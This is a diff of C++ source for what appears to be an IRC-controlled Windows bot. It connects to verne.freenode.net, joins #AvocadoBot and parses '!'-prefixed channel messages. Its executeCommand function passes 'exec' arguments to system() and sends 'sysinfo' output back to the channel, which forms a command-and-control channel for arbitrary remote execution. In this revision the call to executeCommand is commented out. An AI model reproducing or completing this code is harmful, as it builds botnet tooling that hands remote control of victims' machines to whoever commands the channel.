@@ -8,10 +8,8 @@
 #include "IRCManager.h"
 
 IRCManager::IRCManager() {
-	ircc = new IRCClient("127.0.0.1", 6667);
-	ircc->setNickname("Bot");
-	
-	ircc->joinChannel("#AvocadoBot");
+	ircc = new IRCClient("verne.freenode.net", 6665);
+	IRC_CommandPrefix = '!';
 
 	connected = false;
 	hThread = 0;
@@ -29,9 +27,8 @@ bool IRCManager::isConnected() {
 
 void IRCManager::start() {
 	connected = ircc->connect();
-	if(!connected) {
-		return;
-	}
+	ircc->joinChannel("#AvocadoBot");
+	if(!connected) { return; }
 	hThread = this->startThread();
 }
 
@@ -42,11 +39,11 @@ void IRCManager::stop() {
 }
 
 HANDLE IRCManager::startThread() {
-	hThread = (HANDLE)_beginthread(monitor, 0, this);
+	hThread = (HANDLE)_beginthread(monitorIRC, 0, this);
 	return hThread;
 }
 
-void monitor(void* i) {
+void monitorIRC(void* i) {
 	IRCClient* ircc = (IRCClient*)((IRCManager*)i)->ircc;
 	std::string data;
 	data = ircc->readRaw();
@@ -54,7 +51,10 @@ void monitor(void* i) {
 
 	while(true) {
 		data = ircc->readRaw();
+
+		// Check if connection was lost
 		if(data.empty()) {
+			// Close connections and exit
 			((IRCManager*)i)->stop();
 			return;
 		}
@@ -66,8 +66,6 @@ void monitor(void* i) {
 	}
 }
 
-
-// TODO: refactor into parseData for all data, parseCommand for commands
 void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 	std::string prefix;
 	std::string command;
@@ -83,37 +81,57 @@ void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 	// Command
 	stop = data.find(" ", stop);
 	command = data.substr(stop +1, size -2);
-	//command = command.substr(0, command.size() -2);
 
+	// Params
 	stop = command.find_first_of(" ");
 	if(stop != std::string::npos) {
 		params = command.substr(stop +1, command.size() -1);
 		command = command.substr(0, stop);
 	}
-	
-	if(command.at(0) != IRC_CommandPrefix)
+
+	// We only care about messages to the bot
+	if(command.compare("PRIVMSG") != 0)
 		return;
 
-	// Remove special char
-	command = command.substr(1, command.size() -1);
 
-	std::string result = "";
-	result = executeCommand(command, params);
-	if(!result.empty())
-		ircc->sendMessage(ircc->getIRCChannels()[0], result);
+	std::string message;
+
+	stop = params.find_first_of(":");
+	message = params.substr(stop +1, params.size() -1);
+
+	// If Bot command was recieved
+	if(message.at(0) == IRC_CommandPrefix) {
+		// Remove special char
+		message = message.substr(1, message.size() -1);
+
+		// Remove CR/LF
+		message = message.substr(0, message.size() -2);
+	
+		// Execute command and save result
+		std::string result;// = executeCommand(message.substr(0, message.find_first_of(" ")), message.substr(seperator, message.size() -1));
+
+		// If there was a result message, send it to the server
+		if(!result.empty())
+			ircc->sendMessage(ircc->getIRCChannels()[0], result);
+
+	}
 
 	return;
 }
 
 
 std::string executeCommand(std::string command, std::string args) {
-	std::string result;
+	std::string result = "";
 	if(!command.compare("sysinfo")) {
-
+		result = SysInfo::SysInfoString();
 	}
+
 	if(!command.compare("exec")) {
 		system(args.c_str());
 		result = args;
 	}
+
+	std::cout << "Executing command: " << command << " " << args << std::endl;
+
 	return result;
 }
